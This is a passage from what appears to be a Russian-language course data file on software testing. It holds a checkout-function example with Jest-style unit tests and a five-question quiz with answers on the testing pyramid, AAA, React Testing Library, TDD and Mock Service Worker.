        "js": "function checkoutService(cart = [], promo = null, user = null) {\n  if (!user || !user.email) {\n    throw new Error('User email is required for checkout');\n  }\n  \n  const subtotal = cart.reduce((sum, item) => {\n    if (item.price < 0) throw new Error('Invalid item price');\n    return sum + item.price;\n  }, 0);\n\n  let discountAmount = 0;\n  if (promo && promo.code === 'INTERN2026' && promo.percent > 0) {\n    discountAmount = (subtotal * promo.percent) / 100;\n  }\n\n  return {\n    itemsCount: cart.length,\n    subtotal,\n    discountAmount,\n    finalTotal: subtotal - discountAmount,\n    userEmail: user.email\n  };\n}\n\n// Набор тестов (Unit Test Suite):\ndescribe('checkoutService', () => {\n  it('должен корректно рассчитывать итоговую сумму с промокодом', () => {\n    // Arrange\n    const cart = [{ price: 1000 }, { price: 2000 }];\n    const promo = { code: 'INTERN2026', percent: 10 };\n    const user = { email: 'dev@intern.ru' };\n\n    // Act\n    const result = checkoutService(cart, promo, user);\n\n    // Assert\n    expect(result.subtotal).toBe(3000);\n    expect(result.discountAmount).toBe(300);\n    expect(result.finalTotal).toBe(2700);\n    expect(result.itemsCount).toBe(2);\n  });\n\n  it('должен выбрасывать ошибку, если у пользователя не указан email', () => {\n    // Arrange\n    const cart = [{ price: 500 }];\n    const user = { name: 'Гость' }; // нет email\n\n    // Act & Assert\n    expect(() => checkoutService(cart, null, user)).toThrowError(\n      'User email is required for checkout'\n    );\n  });\n});",
        "explanation": "Тест-сьют строго структурирован по блокам AAA, проверяет граничные условия, расчет скидки, обязательные поля и выброс ошибок валидации."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro8-q1",
          "question": "В чём заключается соотношение слоев в классической пирамиде тестирования (Testing Pyramid)?",
          "options": [
            "100% E2E тестов и 0% Unit тестов",
            "70% быстрых Unit-тестов (основание), 20% Integration-тестов компонентов и 10% сквозных E2E-тестов Playwright (вершина)",
            "Тесты должны писаться только для бэкенда",
            "Все тесты должны быть одинаковыми"
          ],
          "correctIndex": 1,
          "explanation": "Пирамида тестов обеспечивает идеальный баланс: тысячи дешевых и мгновенных Unit-тестов защищают логику, Integration проверяет компоненты, а небольшое число E2E проверяет ключевые сценарии."
        },
        {
          "id": "pro8-q2",
          "question": "Что обозначают три фазы в классическом паттерне структуры теста AAA?",
          "options": [
            "Add, Append, Apply",
            "Arrange (подготовка данных и моков) -> Act (вызов функции) -> Assert (проверка ожидаемого результата)",
            "Async, Await, Action",
            "Auth, Access, Admin"
          ],
          "correctIndex": 1,
          "explanation": "Паттерн AAA (Arrange-Act-Assert) — мировой стандарт чистоты тестов, разделяющий подготовку тестовых данных, запуск действия и валидацию результата через expect."
        },
        {
          "id": "pro8-q3",
          "question": "По какому селектору React Testing Library рекомендует искать интерактивные элементы в первую очередь?",
          "options": [
            "По CSS-классу кнопки: container.querySelector('.btn-submit')",
            "По доступной роли: screen.getByRole('button', { name: /сохранить/i })",
            "По внутреннему data-id атрибуту",
            "По имени файла компонента"
          ],
          "correctIndex": 1,
          "explanation": "Поиск по семантическим ролям getByRole имитирует взаимодействие реального пользователя или скринридера и не ломается при изменении CSS-классов."
        },
        {
          "id": "pro8-q4",
          "question": "В чём заключается цикл разработки по методологии TDD (Test-Driven Development)?",
          "options": [
            "Написание кода -> Ручное тестирование в браузере -> Деплой",
            "Red (пишем падающий тест) -> Green (пишем минимальный код для прохождения) -> Refactor (улучшаем код)",
            "Написание тестов после релиза",
            "Тестирование только перед увольнением"
          ],
          "correctIndex": 1,
          "explanation": "TDD цикл Red-Green-Refactor заставляет сначала сформулировать требования в виде падающего теста, затем реализовать рабочий код и провести рефакторинг с гарантией стабильности."
        },
        {
          "id": "pro8-q5",
          "question": "Какое преимущество дает инструмент Mock Service Worker (MSW) при интеграционном тестировании?",
          "options": [
            "MSW удаляет базу данных",
            "MSW перехватывает сетевые запросы на уровне Service Worker, позволяя тестировать реальный сетевой стек fetch/axios без ручной подмены глобальных объектов",
            "MSW ускоряет компиляцию TypeScript",
            "MSW заменяет CSS стили"
          ],
          "correctIndex": 1,
          "explanation": "MSW перехватывает HTTP-трафик на уровне браузерного сетевого слоя (Service Worker), обеспечивая максимально приближенное к продакшену тестирование без грязных моков."
        }
      ]
    }
  }
];
